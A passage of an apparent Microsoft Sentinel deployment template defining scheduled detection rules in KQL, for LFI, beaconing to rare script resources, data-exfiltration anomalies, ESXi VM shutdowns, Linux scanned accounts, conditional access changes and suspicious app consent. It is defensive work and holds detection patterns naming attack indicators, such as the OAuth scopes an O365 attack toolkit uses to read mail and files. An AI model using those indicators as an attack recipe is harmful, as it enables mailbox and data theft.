              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "Potential Local File Inlcusion(LFI) performed by user '{{SrcUsername}}' from IP '{{SrcIpAddr}}'",
            "alertDescriptionFormat": "User requested for URL '{{Url}}' which contains LFI related keywords or indicators. It suggests an attempt to traverse directories and access files outside the intended directory structure"
          },
          "customDetails": {
            "EventStartTime": "EventStartTime",
            "Decoded_url": "Decoded_url",
            "EventEndTime": "EventEndTime",
            "EventCount": "EventCount"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SrcHostname"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.0"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2aeaeec2-3db4-43a4-9593-c4a415505d57')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2aeaeec2-3db4-43a4-9593-c4a415505d57')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect requests for an uncommon resources on the web (ASIM Web Session)",
          "description": "This detection mechanism examines connections made to a domain where only a single file is requested, which is considered unusual since most contemporary web applications require additional resources. Such activity is often associated with malware beaconing or tracking URLs delivered via emails. \nThe query includes a sample set of popular web script extensions (scriptExtensions), which should be customized to align with the specific requirements of your environment",
          "severity": "Low",
          "enabled": true,
          "query": "let lookback = 1d;\nlet scriptExtensions = dynamic([\".php\", \".aspx\", \".asp\", \".cfml\", \".py\", \".sh\", \".bash\", \".pl\"]);\n//The number of URI's seen to be suspicious, higher = less likely to be suspicious\nlet uriThreshold = 1;\nlet ReqestCountThreshold = 10; // set minimum requests count to confirm repetitive connections\n// Only look at connections that were allowed through the web proxy\n_Im_WebSession (starttime=ago(lookback), eventresult='Success')\n| project\n    SrcBytes,\n    DstBytes,\n    Url,\n    TimeGenerated,\n    DstIpAddr,\n    SrcIpAddr,\n    HttpRequestMethod,\n    HttpReferrer\n| where not(ipv4_is_private(DstIpAddr)) // Only take traffic going to internet\n| extend DestHostName = tostring(parse_url(Url)[\"Host\"])\n// Only look at connections where some data was exchanged.\n| where SrcBytes > 0 and DstBytes > 0\n// Extract Domain\n| extend Domain = iif(countof(DestHostName, '.') >= 2, strcat(split(DestHostName, '.')[-2], '.', split(DestHostName, '.')[-1]), DestHostName)\n| extend GetData = iff(Url contains \"?\", 1, 0)\n| summarize\n    EventStartTime = min(TimeGenerated),\n    EventEndTime = max(TimeGenerated),\n    make_set(Url, 100),\n    make_set(DstIpAddr, 100),\n    make_set(SrcIpAddr, 100),\n    EventCount = count(),\n    make_set(HttpRequestMethod, 10),\n    max(GetData),\n    max(HttpReferrer)\n    by Domain\n// Determine the number of URIs that have been visited for the domain\n| extend destinationURICount = array_length(set_Url)\n| where destinationURICount <= uriThreshold and EventCount > ReqestCountThreshold // check for repetitive requests for single resource only.\n| where tostring(set_Url) has_any(scriptExtensions)\n//Remove matches with referer\n| where max_HttpReferrer == \"\"\n//Keep requests where data was transferred either in a GET with parameters or a POST\n| where set_HttpRequestMethod in~ (\"POST\") or max_GetData == 1\n//Defeat email click tracking, may increase FN's while decreasing FP's\n| where set_Url !has \"click\" and set_HttpRequestMethod !has \"GET\"\n| mv-expand set_Url, set_DstIpAddr, set_SrcIpAddr\n| extend\n    RequestURL = tostring(set_Url),\n    DestinationIP = tostring(set_DstIpAddr),\n    SourceIP = tostring(set_SrcIpAddr)\n| project\n    EventStartTime,\n    EventEndTime,\n    SourceIP,\n    DestinationIP,\n    EventCount,\n    RequestURL,\n    set_HttpRequestMethod\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1102",
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "c99cf650-c53b-4c4c-9671-7d7500191a10",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "User with IP '{{SourceIP}}' has been observed making request for a rare resource",
            "alertDescriptionFormat": "User requested (TotalEvents='{{EventCount}}') for URL '{{RequestURL}}' which contains a known script extension. The domain associated with this URL has not been accessed by any other user. This activity could be a potential beaconing activity to maintain control over compromised systems, receive instructions, or exfiltrate data"
          },
          "customDetails": {
            "EventStartTime": "EventStartTime",
            "EventCount": "EventCount",
            "EventEndTime": "EventEndTime"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "DestinationIP"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "RequestURL"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c4bb7e13-a925-4324-8ec5-b16366e663a6')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c4bb7e13-a925-4324-8ec5-b16366e663a6')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Detect unauthorized data transfers using timeseries anomaly (ASIM Web Session)",
          "description": "This query utilizes built-in KQL anomaly detection algorithms to identify anomalous data transfers to public networks. It detects significant deviations from a baseline pattern, allowing the detection of sudden increases in data transferred to unknown public networks, which may indicate data exfiltration attempts. Investigating such anomalies is crucial.\nThe score indicates the degree to which the data transfer deviates from the baseline value. A higher score indicates a greater deviation. The query's output provides an aggregated summary view of the traffic observed in the flagged anomaly hour, including unique combinations of source IP addresses, destination IP addresses, and port bytes sent. It may be necessary to run queries for individual source IP addresses from the provided 'SourceIPlist' to identify any suspicious activity that warrants further investigation",
          "severity": "Medium",
          "enabled": true,
          "query": "let startTime = 14d;\nlet endTime = 1d;\nlet timeframe = 1h;\nlet scorethreshold = 5;\nlet bytessentperhourthreshold = 10;\n// calculate avg. eps(events per second)\nlet eps = materialize(_Im_WebSession(starttime=ago(1d))\n    | project TimeGenerated\n    | summarize AvgPerSec = count() / 3600 by bin(TimeGenerated, 1h)\n    | summarize round(avg(AvgPerSec))\n    );\nlet summarizationexist  = (\n    union isfuzzy=true \n        (\n        WebSession_Summarized_SrcIP_CL\n        | where EventTime_t > ago(1d) \n        | project v = int(2)\n        ),\n        (\n        print int(1) \n        | project v = print_0\n        )\n    | summarize maxv = max(v)\n    | extend sumexist = (maxv > 1)\n    );\nlet TimeSeriesData = union isfuzzy=true \n        (\n        (datatable(exists: int, sumexist: bool)[1, false]\n        | where toscalar(eps) > 1000\n        | join (summarizationexist) on sumexist)\n        | join (\n            _Im_WebSession(starttime=ago(2d), endtime=now())\n            | project DstIpAddr, SrcBytes, TimeGenerated, EventProduct\n            | where isnotempty(DstIpAddr)\n                and not(ipv4_is_private(DstIpAddr))\n                and isnotempty(SrcBytes)\n            | summarize SrcBytesSum=tolong(sum(SrcBytes)) by EventProduct, bin(TimeGenerated, 1h)\n            | extend EventTime = TimeGenerated, exists=int(1)\n            )\n            on exists\n        | project-away exists*, maxv, sum*\n        ),\n        (\n        (datatable(exists: int, sumexist: bool)[1, false]\n        | where toscalar(eps) between (501 .. 1000)\n        | join (summarizationexist) on sumexist)\n        | join (\n            _Im_WebSession(starttime=ago(3d), endtime=now())\n            | project DstIpAddr, SrcBytes, TimeGenerated, EventProduct\n            | where isnotempty(DstIpAddr)\n                and not(ipv4_is_private(DstIpAddr))\n                and isnotempty(SrcBytes)\n            | summarize SrcBytesSum=tolong(sum(SrcBytes)) by EventProduct, bin(TimeGenerated, 1h)\n            | extend EventTime = TimeGenerated, exists=int(1)\n            )\n            on exists\n        | project-away exists*, maxv, sum*\n        ),\n        (\n        (datatable(exists: int, sumexist: bool)[1, false]\n        | where toscalar(eps) <= 500\n        | join (summarizationexist) on sumexist)\n        | join (\n            _Im_WebSession(starttime=ago(4d), endtime=now())\n            | project DstIpAddr, SrcBytes, TimeGenerated, EventProduct\n            | where isnotempty(DstIpAddr)\n                and not(ipv4_is_private(DstIpAddr))\n                and isnotempty(SrcBytes)\n            | summarize SrcBytesSum=tolong(sum(SrcBytes)) by EventProduct, bin(TimeGenerated, 1h)\n            | extend EventTime = TimeGenerated, exists=int(1)\n            )\n            on exists\n        | project-away exists*, maxv, sum*\n        ),\n        (\n        WebSession_Summarized_SrcIP_CL\n        | where EventTime_t between (ago(startTime) .. now())\n        | where isnotempty(SrcBytes_d) and not(DstIPIsPrivate_b)\n        | project\n            SrcBytesSum=tolong(SrcBytes_d),\n            EventTime=EventTime_t,\n            EventProduct = EventProduct_s\n        )\n    | make-series TotalBytesSent = sum(SrcBytesSum) on EventTime from startofday(ago(startTime)) to startofday(now()) step timeframe by EventProduct;\n// TimeSeriesData block ends here\n//Take only anomalies in TimeSeriesData\nlet TimeSeriesAnomalies = materialize(TimeSeriesData\n    | extend (anomalies, score, baseline) = series_decompose_anomalies(TotalBytesSent, scorethreshold, -1, 'linefit')\n    | mv-expand\n        TotalBytesSent to typeof(long),\n        EventTime to typeof(datetime),\n        anomalies to typeof(double),\n        score to typeof(double),\n        baseline to typeof(long)\n    | where anomalies > 0 and baseline > 0\n    | extend AnomalyHour = EventTime\n    | extend\n        TotalBytesSentinMBperHour = round(((TotalBytesSent / 1024) / 1024), 2),\n        BaselineBytesSentinMBperHour = round(((baseline / 1024) / 1024), 2),\n        score = round(score, 2)\n    | project\n        EventProduct,\n        AnomalyHour,\n        TotalBytesSentinMBperHour,\n        BaselineBytesSentinMBperHour,\n        anomalies,\n        score\n    | where AnomalyHour between (startofday(ago(endTime)) .. startofday(now())) // Get TimeSeriesAnomalies in previous day\n        );\n// TimeSeriesAlerts block end here\nlet AnomalyHours = materialize (TimeSeriesAnomalies\n    | project AnomalyHour);\n//Previous day aggregated per hour\nlet PreviousDayLogs = \n    _Im_WebSession(starttime=startofday(ago(endTime)), endtime=startofday(now()))\n    | where isnotempty(DstIpAddr) and isnotempty(SrcIpAddr) and isnotempty(SrcBytes)\n    | where not(ipv4_is_private(DstIpAddr))\n    | project\n        TimeGenerated,\n        DstIpAddr,\n        SrcIpAddr,\n        SrcBytes,\n        DstBytes,\n        DstPortNumber,\n        EventProduct\n    | extend DateHour = bin(TimeGenerated, timeframe) // create a new column and round to hour\n    | where DateHour in (AnomalyHours) // Filter dataset to include only anomaly AnomalyHours\n    | extend\n        SentBytesinMB = ((SrcBytes / 1024) / 1024),\n        ReceivedBytesinMB = ((DstBytes / 1024) / 1024)\n    | summarize\n        HourlyCount = count(),\n        TimeGeneratedMax = arg_max(TimeGenerated, *),\n        DestinationIPList = make_set(DstIpAddr, 100),\n        DestinationPortList = make_set(DstPortNumber, 100),\n        SentBytesinMB = tolong(sum(SentBytesinMB)),\n        ReceivedBytesinMB = tolong(sum(ReceivedBytesinMB))\n        by SrcIpAddr, EventProduct, TimeGeneratedHour = bin(TimeGenerated, timeframe)\n    | where SentBytesinMB > bytessentperhourthreshold\n    | sort by TimeGeneratedHour asc, SentBytesinMB desc\n    | extend Rank=row_number(1, prev(TimeGeneratedHour) != TimeGeneratedHour) // Ranking the dataset per Hourly Partition\n    | where Rank <= 10  // Selecting Top 10 records with Highest BytesSent in each Hour\n    | project\n        EventProduct,\n        TimeGeneratedHour,\n        TimeGeneratedMax,\n        SrcIpAddr,\n        DestinationIPList,\n        DestinationPortList,\n        SentBytesinMB,\n        ReceivedBytesinMB,\n        Rank,\n        HourlyCount;\n// PreviousDayLogs block ends here\nTimeSeriesAnomalies\n| join kind = inner (PreviousDayLogs\n    | extend AnomalyHour = TimeGeneratedHour)\n    on EventProduct, AnomalyHour\n| sort by score desc\n| project\n    EventProduct,\n    AnomalyHour,\n    TimeGeneratedMax,\n    SrcIpAddr,\n    DestinationIPList,\n    DestinationPortList,\n    SentBytesinMB,\n    ReceivedBytesinMB,\n    TotalBytesSentinMBperHour,\n    BaselineBytesSentinMBperHour,\n    score,\n    anomalies,\n    HourlyCount\n| summarize\n    EventCount = sum(HourlyCount),\n    startTimeUtc = min(TimeGeneratedMax),\n    EndTimeUtc = max(TimeGeneratedMax),\n    SentBytesinMB = sum(SentBytesinMB),\n    ReceivedBytesinMB = sum(ReceivedBytesinMB),\n    SourceIP = take_any(SrcIpAddr),\n    SourceIPList = make_set(SrcIpAddr, 10),\n    DestinationIPList = make_set(DestinationIPList, 100),\n    DestinationPortList = make_set(DestinationPortList, 100)\n    by\n    AnomalyHour,\n    TotalBytesSentinMBperHour,\n    BaselineBytesSentinMBperHour,\n    score,\n    anomalies,\n    EventProduct\n| project\n    EventProduct,\n    AnomalyHour,\n    startTimeUtc,\n    EndTimeUtc,\n    SourceIP,\n    SourceIPList,\n    DestinationIPList,\n    DestinationPortList,\n    SentBytesinMB,\n    ReceivedBytesinMB,\n    TotalBytesSentinMBperHour,\n    BaselineBytesSentinMBperHour,\n    anomalies,\n    score,\n    EventCount\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [
            "T1030"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "5965d3e7-8ed0-477c-9b42-e75d9237fab0",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "IP address '{{SourceIP}}' is engaged in data transfers to a public network that exceeds usual levels",
            "alertDescriptionFormat": "Please conduct a thorough investigation of each IPAddresses listed in SourceIPList: '{{SourceIPList}}' to identify any suspicious activities that may require further investigation. 'SourceIPList' include the top 10 client IP addresses that transmitted the highest amount of data during the anomalous hour"
          },
          "customDetails": {
            "DestinationIPList": "DestinationIPList",
            "anomalies": "anomalies",
            "SourceIPList": "SourceIPList",
            "ReceivedBytesinMB": "ReceivedBytesinMB",
            "SentBytesinMB": "SentBytesinMB",
            "DestinationPortList": "DestinationPortList",
            "score": "score",
            "EventCount": "EventCount"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SourceIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0ebfc2ad-75a6-4231-992e-ec2b7aa043aa')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0ebfc2ad-75a6-4231-992e-ec2b7aa043aa')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - VM stopped",
          "description": "Detects when VM was stopped.",
          "severity": "Medium",
          "enabled": false,
          "query": "VMwareESXi\n| where SyslogMessage has ('VmPoweredOffEvent')\n| where SyslogMessage !contains \"VDI\"\n| extend SrcUsername = extract(@'\\[info\\]\\s+\\[(.*?)\\]', 1, SyslogMessage)\n| extend DstHostname = extract(@'\\[\\d+\\]\\s+\\[(.*?)\\s+on', 1, SyslogMessage)\n| extend HostCustomEntity = DstHostname, AccountCustomEntity = SrcUsername\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-070')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-070')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-070: [Hygiene] Linux - Use of accounts regularly scanned by malicious actors",
          "description": "This alert identifies accounts used internally that are typically scanned by malicious actors. This poses a potential risk if the system is exposed to the Internet. MITRE: T1078 Category: Linux tag: Hygiene",
          "severity": "Low",
          "enabled": true,
          "query": "Syslog\n| where TimeGenerated >= ago(1d)\n| where Facility in ('auth','authpriv')\n| parse SyslogMessage with 'Accepted password for ' UserId ' from ' SourceIP ' port ' SourcePort ' ' Protocol\n| where UserId <> ''\n| project TimeGenerated, HostName, UserId, SourceIP, Protocol\n| sort by TimeGenerated desc\n| join kind=innerunique (Syslog\n| where TimeGenerated >= ago(14d)\n| where Facility in ('auth','authpriv')\n| extend FailedDetails = extract_all('Failed password for invalid user (\\\\S+) from (\\\\S+) port \\\\d+ (\\\\S+)',SyslogMessage)\n| mvexpand FailedDetails\n| where FailedDetails <> ''\n| extend UserId=FailedDetails[0],SourceIP=FailedDetails[1],Protocol=FailedDetails[2]\n| where UserId !contains '.'\n| summarize Count=count(),NumberOfIPs=dcount(tostring(SourceIP)) by tostring(UserId)\n| sort by Count) on UserId",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-030')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-030')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-030: [RBA] Azure AD - Conditional Access Policy Modified",
          "description": "An Azure AD conditional access policy has been modified MITRE: T1556 Category: Azure AD tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let ingested_lookback = 5min; // earliest [ingest time] boundary\nlet generated_lookback = 1h; // earliest [log time] boundary\nAuditLogs\n| where TimeGenerated > ago(generated_lookback) and ingestion_time() > ago(ingested_lookback)\n| where ActivityDisplayName == 'Update policy'\n| extend ParsedInitiatedBy = parse_json(InitiatedBy)\n| extend AccountCustomEntity = iff(notnull(ParsedInitiatedBy.user.userPrincipalName),tostring(ParsedInitiatedBy.user.userPrincipalName), tostring(ParsedInitiatedBy.app.displayName))\n| project TimeGenerated, AccountCustomEntity, Result, Policy=tostring(TargetResources[0].displayName), TargetResources, AADOperationType, _ItemId\n| summarize EventCount=count(), Events=make_set(pack_all()), Polices=make_set(tostring(TargetResources[0].displayName)) by AccountCustomEntity, Policy, bin(TimeGenerated, 1h)",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "CredentialAccess",
            "Persistence"
          ],
          "techniques": [
            "T1556"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-076')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-076')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-076: [SOC] Azure AD - Suspicious App Consent - O365 Attack Toolkit",
          "description": "This will alert when a user consents to provide a previously-unknown Azure application with the same OAuth permissions used by the MDSec O365 Attack Toolkit (https://github.com/mdsecactivebreach/o365-attack-toolkit). The default permissions/scope for the MDSec O365 Attack toolkit are contacts.read, user.read, mail.read, notes.read.all, mailboxsettings.readwrite, and files.readwrite.all. Consent to applications with these permissions should be rare, especially as the knownApplications list is expanded, especially as the knownApplications list is expanded. Public contributions to expand this filter are welcome! For further information on AuditLogs please see https://docs.microsoft.com/azure/active-directory/reports-monitoring/reference-audit-activities.Tags: SolarWinds SUNBURST MITRE: T1134 Category: Azure AD tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 1d;\nlet start_time_historical = 14d;\nlet latency = 1d;\nlet joinLookback = 14d;\nAuditLogs\n| where TimeGenerated > ago(start_time + latency)\n| where LoggedByService =~ 'Core Directory'\n| where Category =~ 'ApplicationManagement'\n| where OperationName =~ 'Consent to application'\n| where TargetResources has 'mailboxsettings'\n| extend AppDisplayName = TargetResources.[0].displayName\n| extend AppClientId = tolower(TargetResources.[0].id)\n| where AppClientId !in ((externaldata(knownAppClientId:string, knownAppDisplayName:string)[@'https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Microsoft.OAuth.KnownApplications.csv'] with (format='csv')))\n| extend ConsentFull = TargetResources[0].modifiedProperties[4].newValue\n| parse ConsentFull with * 'ConsentType: ' GrantConsentType ', Scope: ' GrantScope1 ']' *\n| where ConsentFull contains 'contacts.read' and ConsentFull contains 'user.read' and ConsentFull contains 'mail.read' and ConsentFull contains 'notes.read.all' and ConsentFull contains 'mailboxsettings.readwrite' and ConsentFull contains 'Files.ReadWrite.All'\n| where GrantConsentType != 'AllPrincipals' // NOTE: we are ignoring if OAuth application was granted to all users via an admin - but admin due diligence should be audited occasionally\n| extend GrantIpAddress = iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress)\n| extend GrantInitiatedBy = iff(isnotempty(InitiatedBy.user.userPrincipalName),InitiatedBy.user.userPrincipalName, InitiatedBy.app.displayName)\n| extend GrantUserAgent = iff(AdditionalDetails[0].key =~ 'User-Agent', AdditionalDetails[0].value, '')\n| project TimeGenerated, GrantConsentType, GrantScope1, GrantInitiatedBy, AppDisplayName, GrantIpAddress, GrantUserAgent, AppClientId, OperationName, ConsentFull, CorrelationId\n| join kind = leftouter (AuditLogs\n| where TimeGenerated > ago(joinLookback)\n| where LoggedByService =~ 'Core Directory'\n| where Category =~ 'ApplicationManagement'\n| where OperationName =~ 'Add service principal'\n| extend AppClientId = tolower(TargetResources[0].id)\n| extend AppReplyURLs = iff(TargetResources[0].modifiedProperties[1].newValue has 'AddressType', TargetResources[0].modifiedProperties[1].newValue, '')\n| distinct AppClientId, tostring(AppReplyURLs)\n)\non AppClientId\n| join kind = innerunique (AuditLogs\n| where TimeGenerated > ago(joinLookback)\n| where LoggedByService =~ 'Core Directory'\n| where Category =~ 'ApplicationManagement'\n| where OperationName =~ 'Add OAuth2PermissionGrant' or OperationName =~ 'Add delegated permission grant'\n| extend GrantAuthentication = tostring(TargetResources[0].displayName)\n| extend GrantOperation = OperationName\n| project GrantAuthentication, GrantOperation, CorrelationId\n) on CorrelationId\n| extend ExtendedDescription = strcat('User account ', GrantInitiatedBy, ' performed action ', GrantOperation, ' to application ', AppClientId, ' from IP address', GrantIpAddress)\n| project TimeGenerated, ExtendedDescription, GrantConsentType, GrantScope1, GrantInitiatedBy, AppDisplayName, AppReplyURLs, GrantIpAddress, GrantUserAgent, AppClientId, GrantAuthentication, OperationName, GrantOperation, CorrelationId, ConsentFull\n| extend bv_mapping_tag = GrantInitiatedBy",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1134"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This will alert when a user consents to provide a previously-unknown Azure application with the same OAuth permissions used by the MDSec O365 Attack Toolkit.\n\n{{ExtendedDescription}}'\ntag: SOC\nCategory: Azure AD\nMITRE: T1134"
          },
          "customDetails": {
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "GrantIpAddress"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "GrantInitiatedBy"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-077')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-077')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-077: [RBA] O365 - Anonymous SharePoint link created",
          "description": "This alert detects when an anonymous link was created in Sharepoint. The anonymous link allow access to the shared document without any credentials. MITRE: T1213 Category: Office 365 tag: RBA",
          "severity": "Informational",
          "enabled": true,
